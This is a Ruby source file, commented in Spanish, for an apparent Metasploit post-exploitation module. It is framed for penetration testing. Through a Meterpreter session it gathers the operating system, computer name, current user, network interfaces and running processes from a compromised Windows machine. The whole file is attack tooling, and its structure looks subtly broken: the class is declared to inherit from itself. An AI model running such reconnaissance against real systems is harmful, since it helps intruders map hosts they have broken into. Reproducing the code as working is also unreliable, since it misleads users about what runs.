#!/usr/bin/env ruby

=begin
Este script está diseñado para recopilar información de un sistema Windows comprometido
a través de una sesión Meterpreter de Metasploit. Recopila detalles sobre:

El sistema operativo y el nombre del equipo.
El usuario actualmente autenticado en la máquina.
La configuración de red y las interfaces de red.
Los procesos en ejecución.
Esta información es útil en pruebas de penetración y en escenarios de post-explotación,
donde se desea obtener una visión detallada del sistema comprometido.
=end

# Se importa la biblioteca principal de Metasploit (msf/core)
# proporciona clases y métodos para interactuar con el framework de Metasploit.
require 'msf/core'

module Msf
	# Se define un nuevo módulo de clase Post, que hereda de Msf::Post.
	# Esta clase es un módulo de "post-explotación", lo que significa que se ejecuta después de haber comprometido el sistema.
	class Post < Msf::Post
		include Msf::Post::Common
		include Msf::Post::Windows::System
		include Msf::Post::Windows::Net

		# Este método inicializa el módulo con información básica 
		# sobre el nombre, la descripción, el autor y la plataforma del script.
		def initialize(info = {})
			super(update_info(info,
				'Name' => 'Windows Information Gathering',
				'Description' => 'Recopila información del sistema, usuarios, red y procesos de un sistema objetivo Windows.',
				'Author' => ['Tu Nombre'],
				'License' => MSF_LICENSE,
				'Platform' => ['win'],
				'SessionTypes' => ['meterpreter']
			))

			register_options(
				[
					OptInt.new('SESSION', [true, 'ID de la sesión a usar'])
				]
			)
		end

		def run
			session_id = datastore['SESSION']
			print_status("Recopilando información del sistema en la sesión #{session_id}...")

			# Recopilar y mostrar la información
			gather_system_info
			gather_user_info
			gather_network_info
			gather_running_processes
		end

		# Este método recopila información sobre el sistema operativo y el nombre del equipo.
		def gather_system_info
			print_status("Obteniendo información del sistema...")
			sys_info = sysinfo
			print_good("Sistema operativo: #{sys_info['OS']}")
			print_good("Nombre del equipo: #{sys_info['Computer']}")
		end

		# Este método obtiene la información sobre el usuario actual que está ejecutando la sesión Meterpreter.
		def gather_user_info
			print_status("Obteniendo información del usuario...")
			user_info = session.sys.config.getuid
			print_good("Usuario actual: #{user_info}")
		end

		# Este método recopila información sobre las interfaces de red del sistema comprometido.
		def gather_network_info
			print_status("Obteniendo información de red...")
			interfaces = session.net.config.interfaces
			interfaces.each do |interface|
				print_good("Interfaz: #{interface.name}")
				interface.addrs.each do |addr|
					print_good("  Dirección IP: #{addr.ip}" ) if addr.ip
					print_good("  Máscara de red: #{addr.netmask}" ) if addr.netmask
				end
			end
		end

		# Este método obtiene y lista todos los procesos en ejecución en el sistema comprometido.
		def gather_running_processes
			print_status("Obteniendo lista de procesos en ejecución...")
			processes = session.sys.process.processes
			processes.each do |process|
				print_good("Proceso #{process['pid']} - #{process['name']}")
			end
		end
	end
end
